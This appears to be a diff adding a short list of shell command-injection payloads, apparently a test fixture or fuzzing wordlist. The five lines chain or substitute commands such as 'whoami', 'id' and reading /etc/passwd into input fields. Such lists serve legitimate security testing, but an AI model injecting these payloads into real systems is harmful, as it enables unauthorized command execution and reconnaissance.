@@ -1,0 +1,5 @@
+; ls
+| whoami
+&& cat /etc/passwd
+`id`
+$(id)
